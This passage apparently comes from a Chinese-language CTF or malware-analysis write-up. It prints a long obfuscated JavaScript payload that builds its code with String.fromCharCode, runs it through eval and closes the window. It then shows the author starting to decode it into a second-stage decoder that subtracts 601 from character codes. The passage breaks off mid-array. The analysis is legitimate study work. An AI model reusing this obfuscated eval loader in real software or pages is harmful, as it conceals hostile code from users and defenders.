class="variable constant_">RV</span>,xv,kX,kX,ff,<span class="variable constant_">RV</span>,xv,<span class="variable constant_">NW</span>,<span class="variable constant_">FT</span>,ff,<span class="variable constant_">RV</span>,<span class="variable constant_">FT</span>,<span class="title class_">Fi</span>,it,ff,<span class="variable constant_">RV</span>,xv,<span class="variable constant_">NW</span>,<span class="title class_">Fi</span>,ff,<span class="variable constant_">RV</span>,xv,<span class="variable constant_">NW</span>,<span class="title class_">Mb</span>,ff,<span class="variable constant_">RV</span>,xv,kX,<span class="title class_">Mb</span>,ff,<span class="variable constant_">RV</span>,xv,kX,<span class="title class_">Mb</span>,ff,<span class="variable constant_">RV</span>,<span class="variable constant_">FT</span>,<span class="title class_">Fi</span>,<span class="variable constant_">QB</span>,ff,<span class="variable constant_">RV</span>,xv,kX,kX,ff,<span class="variable constant_">RV</span>,<span class="variable constant_">FT</span>,<span class="title class_">Fi</span>,it,ff,<span class="variable constant_">RV</span>,xv,kX,<span class="title class_">Mb</span>,ff,<span class="variable constant_">RV</span>,xv,<span class="variable constant_">NW</span>,zN,ff,<span class="variable constant_">RV</span>,xv,kX,<span class="title class_">Mb</span>,ff,<span class="variable constant_">RV</span>,<span class="variable constant_">FT</span>,<span class="title class_">Fi</span>,<span class="variable constant_">QB</span>,ff,<span class="variable constant_">RV</span>,xv,kX,<span class="title class_">Mb</span>,ff,<span class="variable constant_">RV</span>,<span class="variable constant_">FT</span>,<span class="title class_">Fi</span>,it,ff,<span class="variable constant_">RV</span>,xv,kX,<span class="title class_">Mb</span>,ff,<span class="variable constant_">RV</span>,xv,zN,kX,ff,<span class="variable constant_">RV</span>,xv,kX,<span class="title class_">Mb</span>,ff,<span class="variable constant_">RV</span>,xv,<span class="variable constant_">NW</span>,<span class="title class_">Mb</span>,ff,<span class="variable constant_">RV</span>,<span class="variable constant_">FT</span>,<span class="title class_">Fi</span>,it,ff,<span class="variable constant_">RV</span>,<span class="variable constant_">FT</span>,<span class="title class_">Fi</span>,<span class="title class_">Fi</span>,ff,<span class="variable constant_">RV</span>,xv,<span class="variable constant_">NW</span>,<span class="variable constant_">FT</span>,ff,<span class="variable constant_">RV</span>,<span class="variable constant_">FT</span>,<span class="title class_">Fi</span>,<span class="variable constant_">QB</span>,ff,<span class="variable constant_">RV</span>,<span class="variable constant_">FT</span>,<span class="title class_">Fi</span>,it,ff,<span class="variable constant_">RV</span>,xv,<span class="variable constant_">NW</span>,zN,ff,<span class="variable constant_">RV</span>,<span class="variable constant_">FT</span>,<span class="title class_">Fi</span>,it,ff,<span class="variable constant_">RV</span>,xv,<span class="variable constant_">NW</span>,<span class="variable constant_">QB</span>,ff,<span class="variable constant_">RV</span>,xv,<span class="variable constant_">NW</span>,<span class="title class_">Mb</span>,ff,<span class="variable constant_">RV</span>,xv,kX,<span class="title class_">Mb</span>,ff,<span class="variable constant_">RV</span>,xv,kX,<span class="title class_">Mb</span>,ff,<span class="variable constant_">RV</span>,<span class="variable constant_">FT</span>,<span class="title class_">Fi</span>,<span class="variable constant_">QB</span>,ff,<span class="variable constant_">RV</span>,xv,kX,<span class="title class_">Mb</span>,ff,<span class="variable constant_">RV</span>,xv,zN,kX,ff,<span class="variable constant_">RV</span>,xv,kX,kX,ff,<span class="variable constant_">RV</span>,xv,<span class="variable constant_">NW</span>,<span class="title class_">Mb</span>,ff,<span class="variable constant_">RV</span>,xv,kX,<span class="title class_">Mb</span>,ff,<span class="variable constant_">RV</span>,xv,<span class="variable constant_">NW</span>,<span class="title class_">Mb</span>,ff,<span class="variable constant_">RV</span>,<span class="variable constant_">FT</span>,<span class="title class_">Fi</span>,it,ff,<span class="variable constant_">RV</span>,xv,<span class="variable constant_">NW</span>,zN,ff,<span class="variable constant_">RV</span>,<span class="variable constant_">FT</span>,<span class="title class_">Fi</span>,it,ff,<span class="variable constant_">RV</span>,xv,<span class="variable constant_">NW</span>,<span class="variable constant_">QB</span>,ff,<span class="variable constant_">RV</span>,xv,<span class="variable constant_">NW</span>,<span class="variable constant_">FT</span>,ff,<span class="variable constant_">RV</span>,xv,<span class="variable constant_">NW</span>,zN,ff,<span class="variable constant_">RV</span>,xv,kX,<span class="title class_">Mb</span>,ff,<span class="variable constant_">RV</span>,xv,<span class="variable constant_">NW</span>,<span class="variable constant_">QB</span>,ff,<span class="variable constant_">RV</span>,xv,kX,kX,ff,<span class="variable constant_">RV</span>,xv,kX,<span class="title class_">Mb</span>,ff,<span class="variable constant_">RV</span>,xv,kX,<span class="title class_">Mb</span>,ff,<span class="variable constant_">RV</span>,xv,<span class="variable constant_">NW</span>,it,ff,<span class="variable constant_">RV</span>,xv,kX,<span class="title class_">Mb</span>,ff,<span class="variable constant_">RV</span>,xv,<span class="variable constant_">NW</span>,xv,ff,<span class="variable constant_">RV</span>,xv,kX,<span class="title class_">Mb</span>,ff,<span class="variable constant_">RV</span>,xv,<span class="variable constant_">NW</span>,<span class="title class_">Mb</span>,ff,<span class="variable constant_">RV</span>,<span class="variable constant_">FT</span>,<span class="title class_">Fi</span>,it,ff,<span class="variable constant_">RV</span>,xv,<span class="variable constant_">NW</span>,yN,ff,<span class="variable constant_">RV</span>,<span class="variable constant_">FT</span>,<span class="title class_">Fi</span>,it,ff,<span class="variable constant_">RV</span>,xv,<span class="variable constant_">NW</span>,yN,ff,<span class="variable constant_">RV</span>,xv,<span class="variable constant_">NW</span>,<span class="title class_">Mb</span>,ff,<span class="variable constant_">RV</span>,xv,kX,<span class="title class_">Mb</span>,ff,<span class="variable constant_">RV</span>,xv,kX,<span class="title class_">Mb</span>,ff,<span class="variable constant_">RV</span>,<span class="variable constant_">FT</span>,<span class="title class_">Fi</span>,<span class="variable constant_">QB</span>,ff,<span class="variable constant_">RV</span>,xv,kX,kX,ff,<span class="variable constant_">RV</span>,<span class="variable constant_">FT</span>,<span class="title class_">Fi</span>,it,ff,<span class="variable constant_">RV</span>,xv,kX,<span class="title class_">Mb</span>,ff,<span class="variable constant_">RV</span>,xv,<span class="variable constant_">NW</span>,zN,ff,<span class="variable constant_">RV</span>,xv,kX,<span class="title class_">Mb</span>,ff,<span class="variable constant_">RV</span>,<span class="variable constant_">FT</span>,<span class="title class_">Fi</span>,<span class="variable constant_">QB</span>,ff,<span class="variable constant_">RV</span>,xv,kX,<span class="title class_">Mb</span>,ff,<span class="variable constant_">RV</span>,<span class="variable constant_">FT</span>,<span class="title class_">Fi</span>,it,ff,<span class="variable constant_">RV</span>,xv,kX,<span class="title class_">Mb</span>,ff,<span class="variable constant_">RV</span>,xv,zN,kX,ff,<span class="variable constant_">RV</span>,xv,kX,<span class="title class_">Mb</span>,ff,<span class="variable constant_">RV</span>,xv,<span class="variable constant_">NW</span>,<span class="title class_">Mb</span>,ff,<span class="variable constant_">RV</span>,<span class="variable constant_">FT</span>,<span class="title class_">Fi</span>,it,ff,<span class="variable constant_">RV</span>,<span class="variable constant_">FT</span>,<span class="title class_">Fi</span>,<span class="title class_">Fi</span>,ff,<span class="variable constant_">RV</span>,<span class="variable constant_">FT</span>,<span class="title class_">Fi</span>,yN,ff,<span class="variable constant_">RV</span>,<span class="variable constant_">FT</span>,<span class="title class_">Fi</span>,yN,ff,<span class="variable constant_">RV</span>,<span class="variable constant_">FT</span>,<span class="title class_">Fi</span>,it,ff,<span class="variable constant_">RV</span>,<span class="variable constant_">FT</span>,<span class="title class_">Fi</span>,<span class="title class_">Fi</span>,ff,<span class="variable constant_">RV</span>,<span class="variable constant_">FT</span>,<span class="title class_">Fi</span>,it,ff,<span class="variable constant_">RV</span>,xv,<span class="variable constant_">NW</span>,<span class="title class_">Fi</span>,ff,<span class="variable constant_">RV</span>,xv,<span class="variable constant_">NW</span>,<span class="title class_">Mb</span>,ff,<span class="variable constant_">RV</span>,xv,kX,<span class="title class_">Mb</span>,ff,<span class="variable constant_">RV</span>,xv,kX,<span class="title class_">Mb</span>,ff,<span class="variable constant_">RV</span>,<span class="variable constant_">FT</span>,<span class="title class_">Fi</span>,<span class="variable constant_">QB</span>,ff,<span class="variable constant_">RV</span>,xv,kX,<span class="title class_">Mb</span>,ff,<span class="variable constant_">RV</span>,xv,zN,kX,ff,<span class="variable constant_">RV</span>,<span class="variable constant_">FT</span>,<span class="title class_">Fi</span>,it,ff,<span class="variable constant_">RV</span>,xv,<span class="variable constant_">NW</span>,zN,ff,<span class="variable constant_">RV</span>,<span class="variable constant_">FT</span>,<span class="title class_">Fi</span>,it,ff,<span class="variable constant_">RV</span>,xv,<span class="variable constant_">NW</span>,zN,ff,<span class="variable constant_">RV</span>,<span class="variable constant_">FT</span>,<span class="title class_">Fi</span>,it,ff,<span class="variable constant_">RV</span>,xv,<span class="variable constant_">NW</span>,zN,ff,<span class="variable constant_">RV</span>,<span class="variable constant_">FT</span>,<span class="title class_">Fi</span>,it,ff,<span class="variable constant_">RV</span>,xv,<span class="variable constant_">NW</span>,zN,ff,<span class="variable constant_">RV</span>,<span class="variable constant_">FT</span>,<span class="title class_">Fi</span>,it,ff,<span class="variable constant_">RV</span>,<span class="variable constant_">FT</span>,<span class="title class_">Fi</span>,it,ff,<span class="variable constant_">RV</span>,<span class="variable constant_">FT</span>,<span class="title class_">Fi</span>,yN,ff,<span class="variable constant_">RV</span>,xv,<span class="variable constant_">NW</span>,xv,ff,<span class="variable constant_">RV</span>,xv,zN,<span class="title class_">Fi</span>,ff,<span class="variable constant_">RV</span>,xv,zN,<span class="variable constant_">NW</span>,ff,<span class="variable constant_">RV</span>,xv,zN,<span class="title class_">Fi</span>,ff,<span class="variable constant_">RV</span>,xv,zN,<span class="variable constant_">FT</span>,ff,<span class="variable constant_">RV</span>,<span class="variable constant_">FT</span>,it,zN,ff,<span class="variable constant_">RV</span>,xv,<span class="variable constant_">NW</span>,<span class="variable constant_">QB</span>,ff,<span class="variable constant_">RV</span>,<span class="variable constant_">FT</span>,it,xv,ff,<span class="variable constant_">RV</span>,xv,zN,<span class="title class_">Fi</span>,ff,<span class="variable constant_">RV</span>,xv,zN,it,ff,<span class="variable constant_">RV</span>,xv,yN,yN,ff,<span class="variable constant_">RV</span>,<span class="variable constant_">FT</span>,it,<span class="variable constant_">NW</span>,ff,<span class="variable constant_">RV</span>,xv,yN,yN,ff,<span class="variable constant_">RV</span>,xv,yN,<span class="title class_">Mb</span>,ff,<span class="variable constant_">RV</span>,xv,yN,yN,ff,<span class="variable constant_">RV</span>,<span class="variable constant_">FT</span>,it,zN,ff,<span class="variable constant_">RV</span>,xv,yN,yN,ff,<span class="variable constant_">RV</span>,xv,kX,it,ff,<span class="variable constant_">RV</span>,<span class="variable constant_">FT</span>,<span class="title class_">Fi</span>,<span class="title class_">Fi</span>,ff,<span class="variable constant_">RV</span>,<span class="variable constant_">FT</span>,<span class="title class_">Fi</span>,<span class="variable constant_">NW</span>,ff,<span class="variable constant_">RV</span>,xv,kX,<span class="title class_">Mb</span>,ff,<span class="variable constant_">RV</span>,<span class="variable constant_">FT</span>,<span class="variable constant_">QB</span>,<span class="variable constant_">NW</span>,ff,<span class="variable constant_">RV</span>,xv,kX,zN,ff,<span class="variable constant_">RV</span>,xv,zN,<span class="variable constant_">QB</span>,ff,<span class="variable constant_">RV</span>,xv,kX,it,ff,<span class="variable constant_">RV</span>,xv,xv,<span class="title class_">Mb</span>,ff,<span class="variable constant_">RV</span>,<span class="variable constant_">FT</span>,<span class="variable constant_">QB</span>,it,ff,<span class="variable constant_">RV</span>,<span class="variable constant_">FT</span>,<span class="variable constant_">QB</span>,<span class="variable constant_">QB</span>,ff,<span class="variable constant_">RV</span>,<span class="variable constant_">FT</span>,<span class="variable constant_">QB</span>,kX,ff,<span class="variable constant_">RV</span>,<span class="variable constant_">FT</span>,<span class="title class_">Fi</span>,it,ff,<span class="variable constant_">RV</span>,<span class="variable constant_">FT</span>,<span class="variable constant_">QB</span>,<span class="variable constant_">NW</span>,ff,<span class="variable constant_">RV</span>,<span class="variable constant_">FT</span>,<span class="variable constant_">QB</span>,<span class="variable constant_">FT</span>,ff,<span class="variable constant_">RV</span>,xv,kX,zN,ff,<span class="variable constant_">RV</span>,xv,<span class="variable constant_">NW</span>,kX,ff,<span class="variable constant_">RV</span>,xv,<span class="variable constant_">NW</span>,kX,ff,<span class="variable constant_">RV</span>,xv,<span class="title class_">Mb</span>,<span class="variable constant_">NW</span>,ff,<span class="variable constant_">RV</span>,<span class="variable constant_">FT</span>,<span class="variable constant_">QB</span>,it,ff,<span class="variable constant_">RV</span>,xv,xv,<span class="variable constant_">FT</span>,ff,<span class="variable constant_">RV</span>,<span class="variable constant_">FT</span>,it,it,ff,<span class="variable constant_">RV</span>,<span class="variable constant_">FT</span>,<span class="variable constant_">QB</span>,<span class="variable constant_">FT</span>,ff,<span class="variable constant_">RV</span>,<span class="variable constant_">FT</span>,<span class="title class_">Fi</span>,it,ff,<span class="variable constant_">RV</span>,xv,zN,<span class="variable constant_">QB</span>,ff,<span class="variable constant_">RV</span>,xv,yN,<span class="variable constant_">FT</span>,ff,<span class="variable constant_">RV</span>,xv,kX,xv,ff,<span class="variable constant_">RV</span>,xv,zN,<span class="variable constant_">FT</span>,ff,<span class="variable constant_">RV</span>,xv,<span class="title class_">Mb</span>,<span class="variable constant_">FT</span>,ff,<span class="variable constant_">RV</span>,xv,kX,<span class="title class_">Mb</span>,ff,<span class="variable constant_">RV</span>,<span class="variable constant_">FT</span>,<span class="title class_">Fi</span>,kX,ff,<span class="variable constant_">RV</span>,<span class="variable constant_">FT</span>,<span class="variable constant_">QB</span>,<span class="title class_">Mb</span>,ff,<span class="variable constant_">RV</span>,<span class="variable constant_">FT</span>,<span class="title class_">Fi</span>,it,ff,<span class="variable constant_">RV</span>,xv,zN,<span class="variable constant_">NW</span>,ff,<span class="variable constant_">RV</span>,xv,<span class="variable constant_">NW</span>,<span class="title class_">Fi</span>,ff,<span class="variable constant_">RV</span>,xv,<span class="variable constant_">NW</span>,<span class="variable constant_">NW</span>,ff,<span class="variable constant_">RV</span>,xv,zN,it,ff,<span class="variable constant_">RV</span>,xv,yN,yN,ff,<span class="variable constant_">RV</span>,xv,zN,xv,ff,<span class="variable constant_">RV</span>,xv,kX,kX,ff,<span class="variable constant_">RV</span>,<span class="variable constant_">FT</span>,it,<span class="variable constant_">QB</span>,ff,<span class="variable constant_">RV</span>,<span class="variable constant_">FT</span>,<span class="variable constant_">QB</span>,it,ff,<span class="variable constant_">RV</span>,<span class="variable constant_">FT</span>,<span class="variable constant_">QB</span>,<span class="variable constant_">NW</span>,ff,<span class="variable constant_">RV</span>,xv,yN,yN,ff,<span class="variable constant_">RV</span>,xv,zN,<span class="title class_">Fi</span>,ff,<span class="variable constant_">RV</span>,xv,<span class="variable constant_">NW</span>,<span class="variable constant_">QB</span>,ff,<span class="variable constant_">RV</span>,xv,zN,kX,ff,<span class="variable constant_">RV</span>,xv,<span class="variable constant_">NW</span>,yN,ff,<span class="variable constant_">RV</span>,xv,zN,<span class="title class_">Fi</span>,ff,<span class="variable constant_">RV</span>,xv,zN,it,ff,<span class="variable constant_">RV</span>,xv,yN,yN,ff,<span class="variable constant_">RV</span>,<span class="variable constant_">FT</span>,it,xv,ff,<span class="variable constant_">RV</span>,xv,zN,it,ff,<span class="variable constant_">RV</span>,xv,yN,yN,ff,<span class="variable constant_">RV</span>,xv,zN,xv,ff,<span class="variable constant_">RV</span>,<span class="variable constant_">FT</span>,<span class="title class_">Fi</span>,<span class="variable constant_">FT</span>,ff,<span class="variable constant_">RV</span>,<span class="variable constant_">FT</span>,<span class="variable constant_">QB</span>,it,ff,<span class="variable constant_">RV</span>,<span class="variable constant_">FT</span>,<span class="title class_">Fi</span>,xv,ff,<span class="variable constant_">RV</span>,<span class="variable constant_">FT</span>,<span class="variable constant_">QB</span>,<span class="variable constant_">QB</span>,ff,<span class="variable constant_">RV</span>,xv,yN,yN,ff,<span class="variable constant_">RV</span>,xv,zN,<span class="title class_">Fi</span>,ff,<span class="variable constant_">RV</span>,xv,zN,<span class="title class_">Fi</span>,ff,<span class="variable constant_">RV</span>,xv,xv,<span class="title class_">Fi</span>,ff,<span class="variable constant_">RV</span>,xv,yN,kX,ff,<span class="variable constant_">RV</span>,xv,yN,yN,ff,<span class="variable constant_">RV</span>,xv,yN,<span class="variable constant_">FT</span>,ff,<span class="variable constant_">RV</span>,xv,<span class="variable constant_">FT</span>,<span class="title class_">Fi</span>,ff,<span class="variable constant_">RV</span>,xv,<span class="variable constant_">FT</span>,<span class="variable constant_">QB</span>,ff,<span class="variable constant_">RV</span>,xv,<span class="title class_">Mb</span>,<span class="variable constant_">NW</span>,ff,<span class="variable constant_">RV</span>,xv,<span class="variable constant_">FT</span>,<span class="title class_">Fi</span>,ff,<span class="variable constant_">RV</span>,xv,zN,<span class="variable constant_">FT</span>,ff,<span class="variable constant_">RV</span>,xv,<span class="title class_">Mb</span>,zN,ff,<span class="variable constant_">RV</span>,<span class="variable constant_">FT</span>,<span class="variable constant_">QB</span>,<span class="title class_">Mb</span>,ff,<span class="variable constant_">RV</span>,xv,kX,kX,ff,<span class="variable constant_">RV</span>,<span class="variable constant_">FT</span>,<span class="variable constant_">QB</span>,xv,ff,<span class="variable constant_">RV</span>,<span class="variable constant_">FT</span>,<span class="variable constant_">QB</span>,<span class="variable constant_">FT</span>,ff,<span class="variable constant_">RV</span>,<span class="variable constant_">FT</span>,<span class="variable constant_">QB</span>,<span class="variable constant_">NW</span>,ff,<span class="variable constant_">RV</span>,<span class="variable constant_">FT</span>,<span class="title class_">Fi</span>,xv,ff,<span class="variable constant_">RV</span>,<span class="variable constant_">FT</span>,<span class="variable constant_">QB</span>,<span class="variable constant_">QB</span>,ff,<span class="variable constant_">RV</span>,<span class="variable constant_">FT</span>,<span class="title class_">Fi</span>,zN,ff,<span class="variable constant_">RV</span>,xv,zN,<span class="variable constant_">QB</span>,ff,<span class="variable constant_">RV</span>,xv,zN,kX,ff,<span class="variable constant_">RV</span>,xv,zN,<span class="variable constant_">NW</span>,ff,<span class="variable constant_">RV</span>,xv,<span class="variable constant_">NW</span>,it,ff,<span class="variable constant_">RV</span>,xv,zN,it,ff,<span class="variable constant_">RV</span>,xv,yN,yN,ff,<span class="variable constant_">RV</span>,xv,yN,<span class="variable constant_">FT</span>,ff,<span class="variable constant_">RV</span>,xv,<span class="variable constant_">FT</span>,<span class="title class_">Fi</span>,ff,<span class="variable constant_">RV</span>,xv,<span class="variable constant_">FT</span>,<span class="variable constant_">QB</span>,ff,<span class="variable constant_">RV</span>,xv,<span class="title class_">Mb</span>,<span class="variable constant_">NW</span>,ff,<span class="variable constant_">RV</span>,xv,<span class="variable constant_">FT</span>,<span class="title class_">Fi</span>,ff,<span class="variable constant_">RV</span>,xv,zN,<span class="variable constant_">FT</span>,ff,<span class="variable constant_">RV</span>,xv,<span class="title class_">Mb</span>,zN,ff,<span class="variable constant_">RV</span>,<span class="variable constant_">FT</span>,<span class="variable constant_">QB</span>,<span class="title class_">Mb</span>,ff,<span class="variable constant_">RV</span>,xv,kX,kX,ff,<span class="variable constant_">RV</span>,<span class="variable constant_">FT</span>,<span class="variable constant_">QB</span>,xv,ff,<span class="variable constant_">RV</span>,<span class="variable constant_">FT</span>,<span class="variable constant_">QB</span>,<span class="variable constant_">FT</span>,ff,<span class="variable constant_">RV</span>,<span class="variable constant_">FT</span>,<span class="variable constant_">QB</span>,<span class="variable constant_">NW</span>,ff,<span class="variable constant_">RV</span>,<span class="variable constant_">FT</span>,<span class="title class_">Fi</span>,xv,ff,<span class="variable constant_">RV</span>,<span class="variable constant_">FT</span>,<span class="variable constant_">QB</span>,<span class="variable constant_">QB</span>,ff,<span class="variable constant_">RV</span>,<span class="variable constant_">FT</span>,<span class="title class_">Fi</span>,zN,ff,<span class="variable constant_">RV</span>,xv,zN,<span class="variable constant_">QB</span>,ff,<span class="variable constant_">RV</span>,xv,<span class="variable constant_">NW</span>,it,ff,<span class="variable constant_">RV</span>,xv,zN,it,tg,<span class="variable constant_">QF</span>,<span class="title class_">Im</span>,nd,<span class="title class_">Ge</span>,sV,<span class="variable constant_">RV</span>,<span class="title class_">Gm</span>,<span class="variable constant_">YZ</span>,<span class="title class_">Xj</span>,kF,<span class="variable constant_">RV</span>,<span class="variable constant_">ST</span>,<span class="variable constant_">RV</span>,pV,wt,wV,<span class="title class_">Rp</span>,kz,<span class="variable constant_">CX</span>,<span class="variable constant_">GH</span>,<span class="variable constant_">US</span>,xv,<span class="title class_">Mb</span>,<span class="title class_">Mb</span>,ff,xv,<span class="title class_">Mb</span>,zN,ff,<span class="variable constant_">FT</span>,<span class="title class_">Fi</span>,<span class="title class_">Fi</span>,ff,<span class="variable constant_">FT</span>,<span class="variable constant_">QB</span>,<span class="variable constant_">NW</span>,ff,<span class="variable constant_">FT</span>,<span class="title class_">Fi</span>,xv,ff,<span class="variable constant_">FT</span>,<span class="variable constant_">QB</span>,yN,ff,<span class="variable constant_">FT</span>,<span class="variable constant_">QB</span>,<span class="variable constant_">FT</span>,ff,xv,zN,<span class="variable constant_">FT</span>,ff,xv,<span class="title class_">Mb</span>,zN,ff,<span class="variable constant_">FT</span>,<span class="title class_">Fi</span>,<span class="variable constant_">NW</span>,ff,<span class="variable constant_">FT</span>,<span class="title class_">Fi</span>,it,ff,<span class="variable constant_">FT</span>,<span class="title class_">Fi</span>,kX,ff,<span class="variable constant_">FT</span>,<span class="title class_">Fi</span>,kX,tg,<span class="variable constant_">QF</span>,<span class="title class_">Im</span>,nd,<span class="title class_">Ge</span>,sV,<span class="variable constant_">RV</span>,pV,wt,wV,<span class="title class_">Rp</span>,kz,<span class="variable constant_">CX</span>,<span class="variable constant_">RV</span>,<span class="variable constant_">ST</span>,<span class="variable constant_">RV</span>,tV,<span class="title class_">Gm</span>,<span class="title class_">Wn</span>,<span class="variable constant_">RV</span>,sC,<span class="title class_">Fx</span>,nI,pV,nd,<span class="title class_">Gm</span>,<span class="title class_">Yp</span>,<span class="variable constant_">FF</span>,uS,<span class="title class_">Rp</span>,<span class="title class_">Gm</span>,<span class="title class_">Fx</span>,nI,<span class="variable constant_">GH</span>,<span class="title class_">Gm</span>,<span class="variable constant_">YZ</span>,<span class="title class_">Xj</span>,kF,<span class="variable constant_">QF</span>,<span class="title class_">Im</span>,pV,wt,wV,<span class="title class_">Rp</span>,kz,<span class="variable constant_">CX</span>,cX,wV,<span class="variable constant_">UP</span>,tV,<span class="variable constant_">GH</span>,wt,wl,<span class="variable constant_">NL</span>,<span class="title class_">Ep</span>,uS,<span class="title class_">Lj</span>,ff,<span class="variable constant_">RV</span>,<span class="title class_">Fi</span>,ff,<span class="variable constant_">RV</span>,nI,sV,<span class="variable constant_">UP</span>,<span class="title class_">Gm</span>,<span class="variable constant_">QF</span>,<span class="title class_">Im</span>);<span class="built_in">eval</span>(<span class="title class_">SxhM</span>); <span class="variable language_">window</span>.<span class="title function_">close</span>();&lt;/script&gt;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>有混淆，写脚本还原一下</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable constant_">SK</span>=<span class="number">102</span>,<span class="variable constant_">UP</span>=<span class="number">117</span>,tV=<span class="number">110</span>,<span class="title class_">Fx</span>=<span class="number">99</span>,nI=<span class="number">116</span>,pV=<span class="number">105</span>,wt=<span class="number">111</span>,<span class="variable constant_">RV</span>=<span class="number">32</span>,wV=<span class="number">82</span>,<span class="title class_">Rp</span>=<span class="number">106</span>,kz=<span class="number">81</span>,<span class="variable constant_">CX</span>=<span class="number">78</span>,<span class="variable constant_">GH</span>=<span class="number">40</span>,<span class="variable constant_">PS</span>=<span class="number">70</span>,<span class="variable constant_">YO</span>=<span class="number">86</span>,kF=<span class="number">75</span>,<span class="variable constant_">PO</span>=<span class="number">113</span>,<span class="variable constant_">QF</span>=<span class="number">41</span>,sZ=<span class="number">123</span>,nd=<span class="number">118</span>,<span class="title class_">Ge</span>=<span class="number">97</span>,sV=<span class="number">114</span>,wl=<span class="number">104</span>,<span class="variable constant_">NL</span>=<span class="number">121</span>,<span class="title class_">Ep</span>=<span class="number">76</span>,uS=<span class="number">98</span>,<span class="title class_">Lj</span>=<span class="number">103</span>,<span class="variable constant_">ST</span>=<span class="number">61</span>,<span class="title class_">Ix</span>=<span class="number">34</span>,<span class="title class_">Im</span>=<span class="number">59</span>,<span class="title class_">Gm</span>=<span class="number">101</span>,<span class="variable constant_">YZ</span>=<span class="number">109</span>,<span class="title class_">Xj</span>=<span class="number">71</span>,<span class="title class_">Fi</span>=<span class="number">48</span>,dL=<span class="number">60</span>,cX=<span class="number">46</span>,ho=<span class="number">108</span>,jF=<span class="number">43</span>,<span class="title class_">Gg</span>=<span class="number">100</span>,aV=<span class="number">90</span>,uD=<span class="number">67</span>,<span class="title class_">Nj</span>=<span class="number">83</span>,<span class="variable constant_">US</span>=<span class="number">91</span>,tg=<span class="number">93</span>,vx=<span class="number">45</span>,xv=<span class="number">54</span>,<span class="variable constant_">QB</span>=<span class="number">49</span>,<span class="variable constant_">WT</span>=<span class="number">125</span>,<span class="variable constant_">FT</span>=<span class="number">55</span>,yN=<span class="number">51</span>,ff=<span class="number">44</span>,it=<span class="number">50</span>,<span class="variable constant_">NW</span>=<span class="number">53</span>,kX=<span class="number">57</span>,zN=<span class="number">52</span>,<span class="title class_">Mb</span>=<span class="number">56</span>,<span class="title class_">Wn</span>=<span class="number">119</span>,sC=<span class="number">65</span>,<span class="title class_">Yp</span>=<span class="number">88</span>,<span class="variable constant_">FF</span>=<span class="number">79</span>;</span><br><span class="line"><span class="keyword">var</span> <span class="title class_">SxhM</span> = <span class="title class_">String</span>.<span class="title function_">fromCharCode</span>(<span class="variable constant_">SK</span>,<span class="variable constant_">UP</span>,tV,<span class="title class_">Fx</span>,nI,pV,wt,tV,<span class="variable constant_">RV</span>,pV,wt,wV,<span class="title class_">Rp</span>,kz,<span class="variable constant_">CX</span>,<span class="variable constant_">GH</span>,<span class="variable constant_">PS</span>,<span class="variable constant_">YO</span>,kF,<span class="variable constant_">PO</span>,<span class="variable constant_">QF</span>,sZ,nd,<span class="title class_">Ge</span>,sV,<span class="variable constant_">RV</span>,wt,wl,<span class="variable constant_">NL</span>,<span class="title class_">Ep</span>,uS,<span class="title class_">Lj</span>,<span class="variable constant_">ST</span>,<span class="variable constant_">RV</span>,<span class="title class_">Ix</span>,<span class="title class_">Ix</span>,<span class="title class_">Im</span>,<span class="variable constant_">SK</span>,wt,sV,<span class="variable constant_">RV</span>,<span class="variable constant_">GH</span>,nd,<span class="title class_">Ge</span>,sV,<span class="variable constant_">RV</span>,<span class="title class_">Gm</span>,<span class="variable constant_">YZ</span>,<span class="title class_">Xj</span>,kF,<span class="variable constant_">RV</span>,<span class="variable constant_">ST</span>,<span class="variable constant_">RV</span>,<span class="title class_">Fi</span>,<span class="title class_">Im</span>,<span class="title class_">Gm</span>,<span class="variable constant_">YZ</span>,<span class="title class_">Xj</span>,kF,<span class="variable constant_">RV</span>,dL,<span class="variable constant_">RV</span>,<span class="variable constant_">PS</span>,<span class="variable constant_">YO</span>,kF,<span class="variable constant_">PO</span>,cX,ho,<span class="title class_">Gm</span>,tV,<span class="title class_">Lj</span>,nI,wl,<span class="title class_">Im</span>,<span class="variable constant_">RV</span>,<span class="title class_">Gm</span>,<span class="variable constant_">YZ</span>,<span class="title class_">Xj</span>,kF,jF,jF,<span class="variable constant_">QF</span>,sZ,nd,<span class="title class_">Ge</span>,sV,<span class="variable constant_">RV</span>,tV,<span class="title class_">Gg</span>,aV,uD,<span class="variable constant_">RV</span>,<span class="variable constant_">ST</span>,<span class="variable constant_">RV</span>,<span class="title class_">Nj</span>,nI,sV,pV,tV,<span class="title class_">Lj</span>,cX,<span class="variable constant_">SK</span>,sV,wt,<span class="variable constant_">YZ</span>,uD,wl,<span class="title class_">Ge</span>,sV,uD,wt,<span class="title class_">Gg</span>,<span class="title class_">Gm</span>,<span class="variable constant_">GH</span>,<span class="variable constant_">PS</span>,<span class="variable constant_">YO</span>,kF,<span class="variable constant_">PO</span>,<span class="variable constant_">US</span>,<span class="title class_">Gm</span>,<span class="variable constant_">YZ</span>,<span class="title class_">Xj</span>,kF,tg,<span class="variable constant_">RV</span>,vx,<span class="variable constant_">RV</span>,xv,<span class="title class_">Fi</span>,<span class="variable constant_">QB</span>,<span class="variable constant_">QF</span>,<span class="title class_">Im</span>,wt,wl,<span class="variable constant_">NL</span>,<span class="title class_">Ep</span>,uS,<span class="title class_">Lj</span>,<span class="variable constant_">RV</span>,<span class="variable constant_">ST</span>,<span class="variable constant_">RV</span>,wt,wl,<span class="variable constant_">NL</span>,<span class="title class_">Ep</span>,uS,<span class="title class_">Lj</span>,<span class="variable constant_">RV</span>,jF,<span class="variable constant_">RV</span>,tV,<span class="title class_">Gg</span>,aV,uD,<span class="variable constant_">WT</span>,sV,<span class="title class_">Gm</span>,nI,<span class="variable constant_">UP</span>,sV,tV,<span class="variable constant_">RV</span>,wt,wl,<span class="variable constant_">NL</span>,<span class="title class_">Ep</span>,uS,<span class="title class_">Lj</span>,<span class="variable constant_">WT</span>,<span class="title class_">Im</span>,nd,<span class="title class_">Ge</span>,sV,<span class="variable constant_">RV</span>,wt,wl,<span class="variable constant_">NL</span>,<span class="title class_">Ep</span>,uS,<span class="title class_">Lj</span>,<span class="variable constant_">RV</span>,<span class="variable constant_">ST</span>,<span class="variable constant_">RV</span>,pV,wt,wV,<span class="title class_">Rp</span>,kz,<span class="variable constant_">CX</span>,<span class="variable constant_">GH</span>,<span class="variable constant_">US</span>,<span class="variable constant_">FT</span>,<span class="variable constant_">QB</span>,yN,ff,<span class="variable 